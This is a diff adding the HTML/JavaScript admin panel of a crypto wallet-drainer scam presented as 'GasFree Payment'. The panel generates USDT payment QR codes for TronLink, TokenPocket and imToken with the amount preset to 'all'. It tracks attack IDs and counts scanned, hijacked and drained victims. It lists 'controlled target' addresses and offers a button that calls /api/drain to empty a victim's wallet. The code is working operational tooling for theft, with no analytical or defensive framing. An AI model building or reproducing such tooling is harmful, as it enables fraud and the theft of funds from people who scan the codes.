@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>管理后台</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0a;color:#fff;font-family:-apple-system,sans-serif;min-height:100vh}
+.header{background:#111;border-bottom:1px solid #222;padding:12px 20px;display:flex;justify-content:space-between;align-items:center}
+.header h1{font-size:14px}
+.nav{display:flex;gap:4px}
+.nav-btn{padding:6px 12px;background:#1a1a1a;border:1px solid #222;color:#888;border-radius:6px;cursor:pointer;font-size:11px}
+.nav-btn.active{background:#00d4aa;color:#000;border-color:#00d4aa}
+.container{padding:15px;max-width:900px;margin:0 auto}
+.panel{background:#111;border-radius:10px;padding:15px;margin-bottom:15px;border:1px solid #222}
+.panel-title{font-size:13px;margin-bottom:12px}
+.form-row{display:flex;gap:8px;margin-bottom:10px;flex-wrap:wrap}
+.form-group{flex:1;min-width:120px}
+.form-group label{display:block;color:#888;font-size:10px;margin-bottom:4px}
+.form-group input,.form-group select{width:100%;padding:8px;background:#0f0f1a;border:1px solid #2a2a4a;border-radius:5px;color:#fff;font-size:12px}
+.btn{padding:8px 16px;background:#00d4aa;color:#000;border:none;border-radius:5px;font-size:12px;font-weight:600;cursor:pointer}
+.btn-sm{padding:5px 10px;font-size:10px}
+.btn-red{background:#ff4444;color:#fff}
+.qr-img{max-width:200px;border-radius:8px;margin:10px 0}
+.link-row{display:flex;align-items:center;gap:6px;background:#0f0f1a;padding:6px 10px;border-radius:5px;margin-bottom:5px;font-size:10px}
+.link-row code{flex:1;color:#00d4aa;word-break:break-all}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:10px;margin-bottom:15px}
+.stat{background:#111;border-radius:8px;padding:12px;border:1px solid #222}
+.stat-val{font-size:24px;font-weight:800;color:#00d4aa}
+.stat-lbl{color:#888;font-size:10px;margin-top:3px}
+table{width:100%;border-collapse:collapse;font-size:11px}
+th{text-align:left;padding:8px;background:#0f0f1a;color:#888;border-bottom:1px solid #2a2a4a}
+td{padding:8px;border-bottom:1px solid #1a1a1a;color:#ccc}
+td code{color:#00d4aa;font-size:10px}
+.tag{display:inline-block;padding:2px 6px;border-radius:3px;font-size:9px}
+.tag-ok{background:#00d4aa20;color:#00d4aa}
+.tag-warn{background:#ffb40020;color:#ffb400}
+.tag-red{background:#ff444420;color:#ff4444}
+.hidden{display:none!important}
+.empty{text-align:center;padding:30px;color:#666;font-size:12px}
+</style>
+</head>
+<body>
+<div class="header">
+<h1>🎯 GasFree Payment</h1>
+<div class="nav">
+<button class="nav-btn active" onclick="tab('gen')">生成二维码</button>
+<button class="nav-btn" onclick="tab('stats')">统计</button>
+<button class="nav-btn" onclick="tab('list')">目标</button>
+</div>
+</div>
+<div class="container">
+<div id="t-gen" class="tab">
+<div class="panel">
+<div class="panel-title">📱 生成二维码</div>
+<div class="form-row">
+<div class="form-group"><label>标签</label><input id="l" value="USDT收款"></div>
+<div class="form-group"><label>金额</label><input id="a" value="all"></div>
+<div class="form-group"><label>钱包</label><select id="w"><option value="auto">自动</option><option>TronLink</option><option>TokenPocket</option><option>imToken</option></select></div>
+</div>
+<button class="btn" onclick="gen()">生成</button>
+</div>
+<div id="qr-r" class="panel hidden">
+<div class="panel-title">二维码</div>
+<img id="qr-i" class="qr-img" src="">
+<div style="color:#888;font-size:11px;margin-bottom:8px">ID: <code id="qr-id">-</code></div>
+<div id="qr-links"></div>
+</div>
+</div>
+<div id="t-stats" class="tab hidden">
+<div class="stats">
+<div class="stat"><div class="stat-val" id="s-t">0</div><div class="stat-lbl">总扫描</div></div>
+<div class="stat"><div class="stat-val" id="s-h">0</div><div class="stat-lbl">已劫持</div></div>
+<div class="stat"><div class="stat-val" id="s-d">0</div><div class="stat-lbl">已提币</div></div>
+<div class="stat"><div class="stat-val" id="s-r">0%</div><div class="stat-lbl">成功率</div></div>
+</div>
+<div class="panel">
+<div class="panel-title">按ID查询</div>
+<div class="form-row">
+<div class="form-group"><input id="tid" placeholder="攻击ID"></div>
+<button class="btn btn-sm" onclick="track()">查询</button>
+</div>
+<div id="tr" class="hidden" style="margin-top:12px">
+<div class="stats" style="margin:0">
+<div class="stat"><div class="stat-val" id="tr-t">0</div><div class="stat-lbl">扫描</div></div>
+<div class="stat"><div class="stat-val" id="tr-h">0</div><div class="stat-lbl">劫持</div></div>
+<div class="stat"><div class="stat-val" id="tr-d">0</div><div class="stat-lbl">提币</div></div>
+</div>
+</div>
+</div>
+</div>
+<div id="t-list" class="tab hidden">
+<div class="panel">
+<div class="panel-title" style="display:flex;justify-content:space-between;align-items:center">
+<span>🎯 已控制目标</span>
+<button class="btn btn-sm" onclick="load()">刷新</button>
+</div>
+<table>
+<thead><tr><th>地址</th><th>攻击ID</th><th>状态</th><th>时间</th><th>操作</th></tr></thead>
+<tbody id="tb"><tr><td colspan="5" class="empty">暂无数据</td></tr></tbody>
+</table>
+</div>
+</div>
+</div>
+<script>
+const API=location.origin;
+function tab(t){
+document.querySelectorAll('.tab').forEach(e=>e.classList.add('hidden'));
+document.querySelectorAll('.nav-btn').forEach(e=>e.classList.remove('active'));
+document.getElementById('t-'+t).classList.remove('hidden');
+event.target.classList.add('active');
+if(t==='list')load();if(t==='stats')stats();
+}
+async function gen(){
+const b=event.target;b.textContent='...';b.disabled=true;
+try{
+const r=await fetch(API+'/api/qr',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({label:document.getElementById('l').value,amount:document.getElementById('a').value,walletType:document.getElementById('w').value})});
+const d=await r.json();if(d.error)throw new Error(d.error);
+document.getElementById('qr-i').src=d.img;
+document.getElementById('qr-id').textContent=d.id;
+const links=['universal','tronlink','tp','imtoken','web'];
+document.getElementById('qr-links').innerHTML=links.map(k=>`<div class="link-row"><span style="color:#888;min-width:50px">${k}</span><code>${d.links[k]}</code><button class="btn btn-sm" style="padding:3px 8px;font-size:9px" onclick="cp('${d.links[k]}')">复制</button></div>`).join('');
+document.getElementById('qr-r').classList.remove('hidden');
+}catch(e){alert(e.message);}
+finally{b.textContent='生成';b.disabled=false;}
+}
+function cp(t){navigator.clipboard.writeText(t).then(()=>{const b=event.target;b.textContent='已复制';setTimeout(()=>b.textContent='复制',800);});}
+async function stats(){
+try{
+const r=await fetch(API+'/api/list');const l=await r.json();
+document.getElementById('s-t').textContent=l.length;
+document.getElementById('s-h').textContent=l.filter(h=>h.ok).length;
+document.getElementById('s-d').textContent=l.filter(h=>h.drained).length;
+document.getElementById('s-r').textContent=l.length?Math.round(l.filter(h=>h.ok).length/l.length*100)+'%':'0%';
+}catch(e){}
+}
+async function track(){
+const id=document.getElementById('tid').value.trim();if(!id)return;
+try{
+const r=await fetch(API+'/api/stats/'+id);const d=await r.json();
+document.getElementById('tr-t').textContent=d.total;
+document.getElementById('tr-h').textContent=d.ok;
+document.getElementById('tr-d').textContent=d.drained;
+document.getElementById('tr').classList.remove('hidden');
+}catch(e){alert(e.message);}
+}
+async function load(){
+try{
+const r=await fetch(API+'/api/list');const l=await r.json();
+const tb=document.getElementById('tb');
+if(!l.length){tb.innerHTML='<tr><td colspan="5" class="empty">暂无数据</td></tr>';return;}
+tb.innerHTML=l.map(h=>{
+const cls=h.drained?'tag-red':h.ok?'tag-ok':'tag-warn';
+const txt=h.drained?'已提币':h.ok?'已劫持':'扫描';
+return`<tr><td><code>${h.addr.slice(0,8)}...${h.addr.slice(-6)}</code></td><td><code>${h.aid||'-'}</code></td><td><span class="tag ${cls}">${txt}</span></td><td>${new Date(h.ts).toLocaleString()}</td><td>${!h.drained?`<button class="btn btn-sm btn-red" onclick="drain('${h.addr}')">提币</button>`:'-'}</td></tr>`;
+}).join('');
+}catch(e){}
+}
+async function drain(addr){
+const b=event.target;b.textContent='...';b.disabled=true;
+try{
+const r=await fetch(API+'/api/drain',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({addr})});
+const d=await r.json();alert(JSON.stringify(d,null,2));load();
+}catch(e){alert(e.message);}
+finally{b.textContent='提币';b.disabled=false;}
+}
+const params=new URLSearchParams(location.search);const trackId=params.get('track');if(trackId){tab('stats');document.getElementById('tid').value=trackId;track();}
+</script>
+</body>
+</html>
